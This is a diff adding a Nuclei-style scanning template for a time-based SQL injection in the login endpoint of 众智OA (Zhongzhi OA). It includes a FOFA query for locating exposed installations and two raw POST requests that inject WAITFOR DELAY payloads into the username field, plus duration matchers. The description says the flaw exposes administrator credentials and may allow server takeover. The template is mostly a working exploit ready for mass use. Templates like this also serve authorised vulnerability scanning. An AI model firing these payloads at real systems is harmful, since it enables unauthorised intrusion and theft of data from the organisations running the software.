@@ -1,0 +1,40 @@
+id: zhongzhiOA-Account_Login-sql
+
+info:
+  name: 众智OA办公系统 Login 接口SQL注入漏洞
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="/Account/Login?ACT=Index"
+      众智OA办公系统 /Account/Login 接口存在SQL注入漏洞。攻击者可利用该漏洞执行任意SQL语句，导致数据库敏感信息泄露，如管理员凭证及用户数据。在具备高权限条件下，可能通过注入点写入恶意代码至服务器，进而控制服务器系统权限。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487927&idx=1&sn=248aa658c18d851ba5899dce03bd0e0f&chksm=c267a484f5102d92d104970c676bbd35b2627aecd82baa0b76a9f15482578488245046b21046&token=48786214&lang=zh_CN#rd
+  tags: 众智OA办公系统
+
+
+http:
+- raw:
+  - |
+    POST /Account/Login?ACT=Index&CLR=Home HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+    Content-Type: application/x-www-form-urlencoded
+
+    username=1');WAITFOR+DELAY+'0:0:4'--&password=1&RememberMe=false
+  - |
+    POST /Account/Login?ACT=Index&CLR=Home HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+    Content-Type: application/x-www-form-urlencoded
+
+    username=1');WAITFOR+DELAY+'0:0:8'--&password=1&RememberMe=false
+
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=4 && duration_1<=5'
+    - 'duration_2>=8 && duration_2<=9'
+    condition: and
+
+
+
